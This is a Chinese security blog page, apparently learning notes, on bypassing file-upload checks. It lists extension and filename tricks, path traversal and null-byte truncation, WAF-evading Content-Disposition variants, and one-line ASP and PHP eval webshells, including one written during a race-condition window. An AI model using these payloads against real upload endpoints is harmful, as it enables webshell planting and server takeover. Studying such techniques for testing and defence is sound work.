@@ -1,0 +1,537 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>文件上传绕过 | ZQ-Rookie-Hacker&#39;s Blog</title>
+  <meta name="author" content="ZQ-Rookie-Hacker">
+  
+  <meta name="description" content="引言本文参考文章：https://mp.weixin.qq.com/s/b3tj-8yBXyZ69xr8RzVVsg在此基础基础上补充自己的理解，以及可以尝试的方法以及思路。
+服务端的检测与绕过方法
+浏览器检测：直接关闭浏览器 JavaScript 检查、或者上传正常文件抓包即可。
+后端服务器校验，常见检测点与绕过方向：
+后缀名检测绕过
+MIME 类型检测与绕过
+文件内容检测与绕过
+00 截断绕过
+条件竞争检测与绕过
+
+
+
+MIME 编码参考：https://mp.weixin.qq.com/s/COLw_Edxst-lZsi8MhL6kA
+（注意，这里说的 MIME 编码可不是将 Content-Type 修改为 image&amp;#x2F;png 等类似的方式进行绕过的，这种方式修改的是 MIME type。）
+Multipurpose Internet Mail Extensions (MIME)，通常也称为多用途互联网邮件扩展，从字面意思可以看出，它的出现是为了扩展了电子邮件的格式，支持 ASCII 字符集以外二进制数据（例如图像、音频、视频或其他文件）转换为文本数据，以便能够安全地传输和处理。从 commons-fileupload 库版本 1.3 开始，FileUpload 可以处理 RFC 2047 编码的标头值。
+取 &amp;#x3D; 后的两个两个十六进制数字，并将其转换为 ascii 码值对应的字符。所以 MIME 编码的格式为：
+=?charset?encoding?encoded text?="> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="文件上传绕过"/>
+  <meta property="og:site_name" content="ZQ-Rookie-Hacker&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/zhuzhuxia.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/mobile-optimized.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 8.1.1"><script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']],
+    displayMath: [['$$', '$$'], ['\\[', '\\]']],
+    processEscapes: true,
+    processEnvironments: true
+  },
+  options: {
+    skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+  },
+  startup: {
+    pageReady: () => {
+      return MathJax.startup.defaultPageReady();
+    }
+  }
+};
+</script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">ZQ-Rookie-Hacker&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 文件上传绕过</h1>
+		</div>
+	
+
+
+
+
+<!-- Reading progress bar -->
+<div class="reading-progress-bar" id="reading-progress-bar"></div>
+
+
+<div class="row post">
+		<!-- cols -->
+		
+		<div id="top_meta"></div>
+		<div class="col-md-9">
+		
+
+		<!-- content -->
+		<div class="mypage">
+		  
+		  <!-- 文章统计 -->
+		  <div class="article-stats">
+		    <i class="fa fa-file-text"></i> 字数: <span id="word-count">计算中...</span>
+		    <span style="margin-left: 12px;"><i class="fa fa-clock-o"></i> 阅读时长: <span id="reading-time">计算中...</span></span>
+		  </div>
+		  
+		  
+
+		  <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>本文参考文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/b3tj-8yBXyZ69xr8RzVVsg">https://mp.weixin.qq.com/s/b3tj-8yBXyZ69xr8RzVVsg</a><br>在此基础基础上补充自己的理解，以及可以尝试的方法以及思路。</p>
+<h2 id="服务端的检测与绕过方法"><a href="#服务端的检测与绕过方法" class="headerlink" title="服务端的检测与绕过方法"></a>服务端的检测与绕过方法</h2><ul>
+<li><strong>浏览器检测</strong>：直接关闭浏览器 JavaScript 检查、或者上传正常文件抓包即可。</li>
+<li><strong>后端服务器校验</strong>，常见检测点与绕过方向：<ul>
+<li>后缀名检测绕过</li>
+<li>MIME 类型检测与绕过</li>
+<li>文件内容检测与绕过</li>
+<li>00 截断绕过</li>
+<li>条件竞争检测与绕过</li>
+</ul>
+</li>
+</ul>
+<h2 id="MIME-编码"><a href="#MIME-编码" class="headerlink" title="MIME 编码"></a>MIME 编码</h2><p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/COLw_Edxst-lZsi8MhL6kA">https://mp.weixin.qq.com/s/COLw_Edxst-lZsi8MhL6kA</a></p>
+<p>（注意，这里说的 MIME 编码可不是将 Content-Type 修改为 image&#x2F;png 等类似的方式进行绕过的，这种方式修改的是 MIME type。）</p>
+<p>Multipurpose Internet Mail Extensions (MIME)，通常也称为多用途互联网邮件扩展，从字面意思可以看出，它的出现是为了扩展了电子邮件的格式，支持 ASCII 字符集以外二进制数据（例如图像、音频、视频或其他文件）转换为文本数据，以便能够安全地传输和处理。从 commons-fileupload 库版本 1.3 开始，FileUpload 可以处理 RFC 2047 编码的标头值。</p>
+<p>取 &#x3D; 后的两个两个十六进制数字，并将其转换为 ascii 码值对应的字符。所以 MIME 编码的格式为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=?charset?encoding?encoded text?=</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>=?</code>：编码的起始标记，表示编码的开始。</li>
+<li><code>charset</code>：表示字符集，即非 ASCII 字符所使用的字符编码集。这通常是一个标识字符集的文本字符串，例如 UTF-8 或 ISO-8859-1。</li>
+<li><code>encoding</code>：表示编码方式，即用于将字符编码为 ASCII 字符的具体方法。常见的编码方式包括 “Q” 和 “B”。<ul>
+<li>“Q” 表示 Quoted-Printable 编码，它将非 ASCII 字符编码为 “&#x3D;” 后跟两个十六进制数字的形式。</li>
+<li>“B” 表示 Base64 编码，它将数据编码为一系列 ASCII 字符。</li>
+</ul>
+</li>
+<li><code>encoded text</code>：是实际编码后的文本，即包含非 ASCII 字符的原始文本的编码版本。</li>
+<li><code>?=</code>：编码的结束标记，表示编码的结束。</li>
+</ul>
+<p><strong>举例：</strong></p>
+<ul>
+<li>将 shell.jsp 通过 Quoted-Printable 编码方式为：<code>=?utf-8?Q?=73=68=65=6c=6c=2e=6a=73=70?=</code></li>
+<li>将 shell.jsp 通过 Base64 编码方式为：<code>=?utf-8?B?c2hlbGwuanNw?=</code></li>
+</ul>
+<p>这个知识点与邮件地址解析的编码绕过有点联系：<a href="https://zq-rookie-hacker.github.io/2026/04/20/%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90/">邮件地址解析</a></p>
+<h2 id="文件上传常见问题（上传不回显）"><a href="#文件上传常见问题（上传不回显）" class="headerlink" title="文件上传常见问题（上传不回显）"></a>文件上传常见问题（上传不回显）</h2><ul>
+<li>文件上传不回显</li>
+<li>确认上传成功之后，遍历目录 + 上传文件名，文件名不变的情况</li>
+<li>查看存在的图片地址，优先遍历</li>
+<li>以上寻找文件的方法需要的前提：文件名不变，字典路径足够多</li>
+</ul>
+<ol>
+<li>目录没有执行权限（通过控制文件名进行 <code>../../</code> 跳目录，跳到可以执行脚本语言的目录）</li>
+<li>上传文件找不到路径（通过控制文件名进行 <code>../../</code> 跳目录，层级跳到根目录进行访问）</li>
+<li>上传白名单截断（有些文件上传处是白名单，后缀名不可以绕，可以利用控制文件名截断的方式去绕过白名单，例如 <code>1.jsp%00.jpg</code>）</li>
+</ol>
+<h2 id="截断文件前置名"><a href="#截断文件前置名" class="headerlink" title="截断文件前置名"></a>截断文件前置名</h2><p>利用跳目录：因为文件名可以控制，我们就可以利用 <code>../</code> 跳目录的方式去截断代码本身给添加的前置名。</p>
+<p><strong>举例：</strong> 上传 <code>1.txt</code>，代码会自动添加 <code>xxxx_xxxx_20_1.txt</code></p>
+<p>这里的利用思路就是上传配合解析的配置文件，例如上传 <code>.htaccess</code> 配合解析，当然这里实战应用的场景还有很多，只是提供一个思路。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;url&quot;; filename=&quot;///\..\..\111.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过宝塔限制（看具体情况）"><a href="#绕过宝塔限制（看具体情况）" class="headerlink" title="绕过宝塔限制（看具体情况）"></a>绕过宝塔限制（看具体情况）</h2><ul>
+<li>宝塔限制的规则是 <code>../../</code> 这种目录穿越，但是宝塔没有限制 <code>.././../</code> 这种目录穿越，所以我们可以使用 <code>.././../</code> 来绕过宝塔的限制</li>
+<li>用 <code>.../1.png</code> 可以穿</li>
+</ul>
+<h2 id="黑名单绕过：不同脚本语言支持的解析后缀"><a href="#黑名单绕过：不同脚本语言支持的解析后缀" class="headerlink" title="黑名单绕过：不同脚本语言支持的解析后缀"></a>黑名单绕过：不同脚本语言支持的解析后缀</h2><p>黑名单简单来说就是目标程序规定了哪些文件不能上传，这里是常用的一些后缀。</p>
+<p><strong>PHP 脚本后缀绕过：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.php  .php2  .php3  .php4  .php5  .php6  .php7  .phps  .pht  .phtm</span><br><span class="line">.phtml  .pgif  .shtml  .htaccess  .phar  .inc  .hphp  .ctp  .module</span><br></pre></td></tr></table></figure>
+
+<p><strong>ASP 脚本后缀绕过：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.asp  .aspx  .config  .ashx  .asmx  .aspq  .axd  .cshtm  .cshtml</span><br><span class="line">.rem  .soap  .vbhtm  .vbhtml  .asa  .cer  .shtml</span><br></pre></td></tr></table></figure>
+
+<p><strong>JSP 脚本后缀绕过：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.jsp  .jspx  .jsw  .jsv  .jspf</span><br></pre></td></tr></table></figure>
+
+<p><strong>其他：</strong></p>
+<ul>
+<li>Coldfusion：<code>.cfm</code>  <code>.cfml</code>  <code>.cfc</code>  <code>.dbm</code></li>
+<li>Perl：<code>.pl</code>  <code>.cgi</code></li>
+<li>随机大小写变换：<code>.pHp</code>  <code>.pHP5</code>  <code>.PhAr</code></li>
+</ul>
+<h2 id="白名单绕过：针对安全设备检测后缀的形式进行绕过"><a href="#白名单绕过：针对安全设备检测后缀的形式进行绕过" class="headerlink" title="白名单绕过：针对安全设备检测后缀的形式进行绕过"></a>白名单绕过：针对安全设备检测后缀的形式进行绕过</h2><p>白名单简单来说就是目标程序规定了能上传的后缀名。这里以 php 为例，其他的类似：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file.png.php</span><br><span class="line">file.png.Php5</span><br><span class="line">file.php%20</span><br><span class="line">file.php%0a</span><br><span class="line">file.php%00</span><br><span class="line">file.php%0d%0a</span><br><span class="line">file.php/</span><br><span class="line">file.php.\</span><br><span class="line">file.</span><br><span class="line">file.php....</span><br><span class="line">file.pHp5....</span><br><span class="line">file.png.php</span><br><span class="line">file.png.pHp5</span><br><span class="line">file.php#.png</span><br><span class="line">file.php%00.png</span><br><span class="line">file.php\x00.png</span><br><span class="line">file.php%0a.png</span><br><span class="line">file.php%0d%0a.png</span><br><span class="line">file.phpJunk123png</span><br><span class="line">file.png.jpg.php</span><br><span class="line">file.php%00.png%00.jpg</span><br></pre></td></tr></table></figure>
+
+<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ul>
+<li>可以利用上传时候的代码执行的需要一定的时间，加大客户端请求时候的并发，造成文件上传时候条件竞争。</li>
+<li>准备好 webshell，这个 webshell 的功能要能写一个大马到 webapp 根目录下，然后我们访问这个大马。</li>
+<li>先开两个 intruder，然后请求上传的文件的并发开到 100。</li>
+<li>访问大马的地址，检查是否创建成功。</li>
+</ul>
+<h2 id="文件上传-WAF-绕过"><a href="#文件上传-WAF-绕过" class="headerlink" title="文件上传 WAF 绕过"></a>文件上传 WAF 绕过</h2><p>参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/BLjfhMNkiTuSiIB9ZKAb2Q">https://mp.weixin.qq.com/s/BLjfhMNkiTuSiIB9ZKAb2Q</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/FW93imGul0kNxbi2RhXBfA">https://mp.weixin.qq.com/s/FW93imGul0kNxbi2RhXBfA</a></li>
+</ul>
+<p><strong>（1）通过 filename 换行来绕过检测（三种均可）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种：</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.p</span><br><span class="line">hp&quot;</span><br><span class="line"></span><br><span class="line">第二种：</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; file</span><br><span class="line">name=&quot;1.php&quot;</span><br><span class="line"></span><br><span class="line">第三种：</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=</span><br><span class="line">&quot;1.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>（2）使用多个等号绕过检测：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename===&quot;a.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>（3）增大文件大小，类似于 sql 注入的大量垃圾字符绕 waf 检测：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; aaaaaaaaaaaaaaaaaaaaa......aaaaaaaaaaaaaaaaaaaaa;name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>（4）去掉双引号或替换为单引号绕过 waf：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种：</span><br><span class="line">Content-Disposition: form-data; name=file1; filename=a.php</span><br><span class="line"></span><br><span class="line">第二种：</span><br><span class="line">Content-Disposition: form-data; name=&#x27;file1&#x27;; filename=&quot;a.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>（5）有些只检测第一个 filename，可以增加 filename 干扰拦截：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename= ; filename=&quot;a.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>（6）混淆 waf 匹配字段：混淆 form-data：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line"># 去除 form-data</span><br><span class="line"></span><br><span class="line">Content-Disposition: AAAAAAAA=&quot;BBBBBBBB&quot;; name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line"># 替换 form-data 为垃圾值</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data   ; name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line"># form-data 后加空格</span><br><span class="line"></span><br><span class="line">Content-Disposition: for+m-data; name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line"># form-data 中加 +</span><br></pre></td></tr></table></figure>
+
+<p><strong>（7）混淆 ConTent-Disposition：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">COntEnT-DIsposiTiOn: form-data; name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line"># 大小写混淆</span><br><span class="line"></span><br><span class="line">Content-Type: image/gif</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line"># 调换 Content-Type 和 ConTent-Disposition 的顺序</span><br><span class="line"></span><br><span class="line">Content-Type: image/gif</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line"># 增加额外的头</span><br><span class="line"></span><br><span class="line">AAAAAAAA:filename=&quot;aaa.jpg&quot;;</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line"># 增加额外的头</span><br><span class="line"></span><br><span class="line">Content-Length: 666</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line"># 增加额外的头</span><br></pre></td></tr></table></figure>
+
+<p><strong>（8）双文件绕过</strong></p>
+<p>例如安全狗总以最后一个 Content-Disposition 中的值作为接收参数进行检测，一些中间件例如 IIS6.0 总是以第一个 Content-Disposition 中的值作为接收参数。</p>
+<p><strong>（9）容器与 WAF 对 Boundary 要求规则不一致</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=---------------------------471****1141173****525****99</span><br><span class="line">Content-Length: 253</span><br><span class="line">-----------------------------471****1141173****525****99</span><br><span class="line">Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">&lt;%eval request(&quot;a&quot;)%&gt;</span><br><span class="line">-----------------------------471****1141173****525****99--</span><br></pre></td></tr></table></figure>
+
+<p><strong>（10）条件竞争（上传→检测→删除窗口）</strong></p>
+<p>一些情况下在上传文件时，先上传到临时目录，然后再检测，检测到再删除。例如：可以上传生成一句话木马的文件：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell6666.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>上传同时疯狂重复发包访问此文件，就有可能会在文件被删除之前生成 webshell 文件 a.php。</p>
+
+		  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+
+		  <script>
+		    // 计算字数与阅读时长，同时更新阅读进度条
+		    (function() {
+		      var content = document.querySelector('.mypage');
+		      if (content) {
+		        var text = content.innerText || content.textContent;
+		        // 中文字符（含 CJK 扩展区 + 标点），按字符计数
+		        var chineseChars = (text.match(/[一-鿿㐀-䶿豈-﫿　-〿＀-￯]/g) || []).length;
+		        // 英文/数字按字符计（非词），与 CSDN 统计方式一致
+		        var latinChars = (text.match(/[a-zA-Z0-9]/g) || []).length;
+		        var wordCount = chineseChars + latinChars;
+		        // 阅读时长：中文约 300 字/分钟，英文约 200 词/分钟
+		        var englishWords = (text.match(/[a-zA-Z0-9]+/g) || []).length;
+		        var readingTime = Math.max(1, Math.ceil(chineseChars / 300 + englishWords / 200));
+		        var wcEl = document.getElementById('word-count');
+		        var rtEl = document.getElementById('reading-time');
+		        if (wcEl) wcEl.textContent = '~' + wordCount + ' 字';
+		        if (rtEl) rtEl.textContent = '约 ' + readingTime + ' 分钟';
+		      }
+		      // 阅读进度条
+		      var bar = document.getElementById('reading-progress-bar');
+		      if (bar) {
+		        window.addEventListener('scroll', function() {
+		          var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+		          var docHeight = document.documentElement.scrollHeight - window.innerHeight;
+		          var progress = docHeight > 0 ? Math.min(100, (scrollTop / docHeight) * 100) : 0;
+		          bar.style.width = progress + '%';
+		        });
+		      }
+		    })();
+		  </script>
+		</div>
+
+		
+		<span id="" class="leancloud-visitors view" data-flag-title="文件上传绕过">
+			<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+		</span>
+		
+		
+		<div>
+	  	<center>
+
+		<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2026/08/12/CSRF基础/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+	    </center>
+		</div>
+
+		<!-- comment -->
+		
+			<section id="comments" class="comments">
+				<style>
+				.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+				@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+				</style>
+				<div id="vcomment" class="comment"></div>
+<script>
+// 延迟加载评论系统
+window.addEventListener('load', function() {
+  setTimeout(function() {
+    var script = document.createElement('script');
+    script.src = 'https://unpkg.com/valine@1.5.1/dist/Valine.min.js';
+    script.onload = function() {
+      var valineConfig = {"enable":true,"appId":"22F2XnoONZRtEbXvXO1SDcjS-gzGzoHsz","appKey":"bIFSRG6LeUO90VdfRBHUXNQs","placeholder":"说点什么吧~","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+      valineConfig.el = '#vcomment';
+      valineConfig.recordIP = true;
+      valineConfig.serverURLs = 'https://22f2xnoo.api.lncldglobal.com';
+      new Valine(valineConfig);
+    };
+    document.head.appendChild(script);
+  }, 1000); // 延迟1秒加载
+});
+</script>
+			</section>
+		
+		
+		
+		</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+		<div id="side_meta">
+			<div class="col-md-3 sticky-meta" id="post_meta"> 
+
+	<!-- small fixed card (date + brief meta) -->
+	<div class="top-card">
+		<!-- date -->
+		
+		<div class="meta-widget">
+		<i class="fa fa-clock-o"></i>
+		2026-08-17
+		</div>
+		
+
+		<!-- brief categories/tags inside fixed card -->
+		
+		<div class="meta-widget small-cats">
+			<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>
+			<ul id="categorys" class="tag_box list-unstyled collapse in">
+				  
+  <li>
+    <li><a href="/categories/网络安全/">网络安全<span>46</span></a></li> <li><a href="/categories/网络安全/漏洞/">漏洞<span>14</span></a></li> <li><a href="/categories/网络安全/漏洞/WEB安全/">WEB安全<span>10</span></a></li> <li><a href="/categories/网络安全/漏洞/WEB安全/Top10/">Top10<span>10</span></a></li>
+  </li>
+
+			</ul>
+		</div>
+		
+
+		
+		<div class="meta-widget small-tags">
+			<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>
+			<ul id="tags" class="tag_box list-unstyled collapse in">
+				  
+  <li><a href="/tags/文件上传/">文件上传<span>1</span></a></li>
+			</ul>
+		</div>
+		
+	</div>
+
+	<!-- All Categories: sticky within sidebar area -->
+	<div class="category-stick" id="category-stick">
+		
+<div class="widget-wrap">
+  <h3 class="widget-title" style="font-family: monospace; font-size: 1.3em; font-weight: bold; color: #fff;">Categories</h3>
+  <div class="widget category-tree">
+    <ul class="hacker-category-list"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/">408</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/AI/">AI</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/AI/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/">深度学习</a><span class="hacker-category-list-count">2</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/">CTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/">BUUCTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/PWN/">PWN</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/WEB/">WEB</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/">知识杂碎</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/">python</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="hacker-category-list-count">41</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/">SRC&渗透</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/SRC/">SRC</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/">内网</a><span class="hacker-category-list-count">3</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="hacker-category-list-count">20</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Linux/">Linux</a><span class="hacker-category-list-count">4</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/windows/">windows</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%89%8D%E7%AB%AF/">前端</a><span class="hacker-category-list-count">6</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%90%8E%E7%AB%AF/">后端</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" 